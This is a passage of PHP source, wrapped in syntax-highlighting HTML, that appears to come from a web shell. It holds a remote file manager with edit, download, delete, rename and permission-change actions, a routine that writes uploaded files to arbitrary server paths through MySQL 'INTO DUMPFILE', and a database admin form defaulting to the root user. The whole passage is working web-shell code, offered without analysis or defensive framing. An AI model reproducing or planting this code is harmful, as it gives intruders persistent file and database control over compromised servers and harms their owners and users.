#2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }// while\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   unset($dirdb);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   unset($filedb);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @closedir($dirs);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @sort($dirdata);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @sort($filedata);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dir_i = '0';\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form id=\"filelist\" name=\"filelist\" action=\"'.$self.'\" method=\"post\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','file');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('thefile');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('doing');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($dirdata as $key =&gt; $dirdb){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($dirdb['filename']!='..' &amp;&amp; $dirdb['filename']!='.') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($getdir &amp;&amp; $getdir == $dirdb['server_link']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $attachsize = dirsize($dirdb['server_link']);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $attachsize = is_numeric($attachsize) ? sizecount($attachsize) :<span style=\"text-decoration: underline;\"> 'Unknown';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $attachsize = '&lt;a href=\"javascript:getsize(\\''.$dirdb['server_li<span style=\"text-decoration: underline;\">nk'].'\\',\\''.$dir.'\\');\"&gt;Stat&lt;/a&gt;';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" o<span style=\"text-decoration: underline;\">nmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td width=\"2%\" nowrap&gt;&lt;input name=\"dl[]\" type=\"checkbox\" value=\"'<span style=\"text-decoration: underline;\">.$dirdb['server_link'].'\"&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;&lt;a href=\"javascript:godir(\\''.$dirdb['server_link'].'\\');\"&gt;'.<span style=\"text-decoration: underline;\">$dirdb['filename'].'&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;&lt;a href=\"javascript:opfile(\\'newtime\\',\\''.$dirdb['ser<span style=\"text-decoration: underline;\">ver_link'].'\\',\\''.$dirdb['dirlink'].'\\');\"&gt;'.$dirdb['mtime'].'&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;'.$attachsize.'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\"&gt;'.$<span style=\"text-decoration: underline;\">dirdb['dirchmod'].'&lt;/a&gt; / ');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\"&gt;'.$<span style=\"text-decoration: underline;\">dirdb['dirperm'].'&lt;/a&gt;'.$dirdb['fileowner'].'&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;&lt;a href=\"javascript:rename(\\''.$dirdb['server_link'].'<span style=\"text-decoration: underline;\">\\');\"&gt;Rename&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dir_i++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($dirdb['filename']=='..') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class='.bg().'&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td align=\"center\"&gt;-&lt;/td&gt;&lt;td nowrap colspan=\"5\"&gt;&lt;a href=\"java<span style=\"text-decoration: underline;\">script:godir(\\''.getUpPath($nowpath).'\\');\"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr bgcolor=\"#dddddd\" stlye=\"border-top:1px solid #fff;border-bottom:1px <span style=\"text-decoration: underline;\">solid #ddd;\"&gt;&lt;td colspan=\"6\" height=\"5\"&gt;&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $file_i = '0';\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($filedata as $key =&gt; $filedb){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($filedb['filename']!='..' &amp;&amp; $filedb['filename']!='.') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fileurl = str_replace($_SERVER[\"DOCUMENT_ROOT\"],'',$filedb['server_<span style=\"text-decoration: underline;\">link']);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" o<span style=\"text-decoration: underline;\">nmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td width=\"2%\" nowrap&gt;&lt;input name=\"dl[]\" type=\"checkbox\" value=\"'<span style=\"text-decoration: underline;\">.$filedb['server_link'].'\"&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.((strpos($filedb['server_link'], $_SERVER[\"DOCUMENT_ROOT\"])<span style=\"text-decoration: underline;\"> !== false) ? '&lt;a href=\"'.$fileurl.'\" target=\"_blank\"&gt;'.$filedb['filename'].'&lt;/a&gt;' : $filedb['filename']).'&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;&lt;a href=\"javascript:opfile(\\'newtime\\',\\''.$filedb['se<span style=\"text-decoration: underline;\">rver_link'].'\\',\\''.$filedb['dirlink'].'\\');\"&gt;'.$filedb['mtime'].'&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;'.$filedb['size'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:fileperm(\\''.$filedb['server_link'].'\\');\"&gt;'.<span style=\"text-decoration: underline;\">$filedb['filechmod'].'&lt;/a&gt; / ');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:fileperm(\\''.$filedb['server_link'].'\\');\"&gt;'.<span style=\"text-decoration: underline;\">$filedb['fileperm'].'&lt;/a&gt;'.$filedb['fileowner'].'&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td nowrap&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:dofile(\\'downfile\\',\\''.$filedb['server_link'<span style=\"text-decoration: underline;\">].'\\');\"&gt;Down&lt;/a&gt; | ');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:copyfile(\\''.$filedb['server_link'].'\\');\"&gt;Co<span style=\"text-decoration: underline;\">py&lt;/a&gt; | ');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:opfile(\\'editfile\\',\\''.$filedb['server_link'<span style=\"text-decoration: underline;\">].'\\',\\''.$filedb['dirlink'].'\\');\"&gt;Edit&lt;/a&gt; | ');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:rename(\\''.$filedb['server_link'].'\\');\"&gt;Rena<span style=\"text-decoration: underline;\">me&lt;/a&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/td&gt;&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $file_i++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width=\"16%\"&gt;Last mod<span style=\"text-decoration: underline;\">ified&lt;/td&gt;&lt;td width=\"10%\"&gt;Size&lt;/td&gt;&lt;td width=\"20%\"&gt;Chmod / Perms&lt;/td&gt;&lt;td width=\"22%\"&gt;Action&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.bg().'\"&gt;&lt;td align=\"center\"&gt;&lt;input name=\"chkall\" value=\"on\" t<span style=\"text-decoration: underline;\">ype=\"checkbox\" onclick=\"CheckAll(this.form)\" /&gt;&lt;/td&gt;&lt;td colspan=\"4\"&gt;&lt;a href=\"javascript:dofile(\\'delfiles\\');\"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align=\"right\"&gt;'.$dir_i.' directories / '.$file_i.' files&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/form&gt;&lt;/table&gt;');\n}// end dir\n\nelseif ($action == 'sqlfile') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($doing==\"mysqlupload\"){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $file = $_FILES['uploadfile'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filename = $file['tmp_name'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (file_exists($savepath)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('The goal file has already existed');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(!$filename) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Please choose a file');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fp=@fopen($filename,'r');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $contents=@fread($fp, filesize($filename));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @fclose($fp);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $contents = bin2hex($contents);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(!$upname) $upname = $file['name'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$<span style=\"text-decoration: underline;\">dbport);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE <span style=\"text-decoration: underline;\">'$savepath';\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m($result ? 'Upload success' : 'Upload has failed: '.mysql_error<span style=\"text-decoration: underline;\">());</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n?&gt;\n&lt;script type=\"text/javascript\"&gt;\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">mysqlfile</span>(doing){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(!doing)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('doing').value=doing;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').dbport.value=$('dbinfo').dbport.value;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').dbname.value=$('dbinfo').dbname.value;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').charset.value=$('dbinfo').charset.value;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('mysqlfile').<span style=\"color: #f99157;\">submit</span>();\n}\n&lt;/script&gt;\n&lt;?php\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dbhost &amp;&amp; $dbhost = 'localhost';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dbuser &amp;&amp; $dbuser = 'root';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dbport &amp;&amp; $dbport = '3306';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'MYSQL Information','name'=&gt;'dbinfo'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','sqlfile');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBHost:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(':');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBUser:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBPass:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBName:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'dbname','size'=&gt;15,'value'=&gt;$dbname));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('DBCharset:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset<span style=\"text-decoration: underline;\">,'nokey'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\" name<span style=\"text-decoration: underline;\">=\"mysqlfile\" id=\"mysqlfile\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Upload file&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;Save path(fullpath): &lt;input class=\"input\" name=\"savepath\" size=\"45\" ty<span style=\"text-decoration: underline;\">pe=\"text\" /&gt; Choose a file: &lt;input class=\"input\" name=\"uploadfile\" type=\"file\" /&gt; &lt;a href=\"javascript:mysqlfile(\\'mysqlupload\\');\"&gt;Upload&lt;/a&gt;&lt;/p&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Download file&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;File: &lt;input class=\"input\" name=\"mysqldlfile\" size=\"115\" type=\"text\" /<span style=\"text-decoration: underline;\">&gt; &lt;a href=\"javascript:mysqlfile(\\'mysqldown\\');\"&gt;Download&lt;/a&gt;&lt;/p&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dbhost');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dbport');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dbuser');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dbpass');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dbname');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('charset');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('doing');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','sqlfile');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/form&gt;');\n}\n\nelseif ($action == 'mysqladmin') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dbhost &amp;&amp; $dbhost = 'localhost';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dbuser &amp;&amp; $dbuser = 'root';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dbport &amp;&amp; $dbport = '3306';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform = '&lt;input type=\"hidden\" id=\"connect\" name=\"connect\" value=\"1\" /&gt;';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(isset($dbhost)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform .= \"&lt;input type=\\\"hidden\\\" id=\\\"dbhost\\\" name=\\\"dbhost\\\" value=\\<span style=\"text-decoration: underline;\">\"$dbhost\\\" /&gt;\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(isset($dbuser)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform .= \"&lt;input type=\\\"hidden\\\" id=\\\"dbuser\\\" name=\\\"dbuser\\\" value=\\<span style=\"text-decoration: underline;\">\"$dbuser\\\" /&gt;\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(isset($dbpass)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform .= \"&lt;input type=\\\"hidden\\\" id=\\\"dbpass\\\" name=\\\"dbpass\\\" value=\\<span style=\"text-decoration: underline;\">\"$dbpass\\\" /&gt;\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(isset($dbport)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dbform .= \"&lt;input type=\\\"hidden\\\" id=\\\"dbport\\\" name=\\\"dbport\\\" value=\\<span style=\"text-decoration: underline;\">\"$dbport\\\" /&gt;\\n\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(isset($dbname)) {\n<span style=\"color: 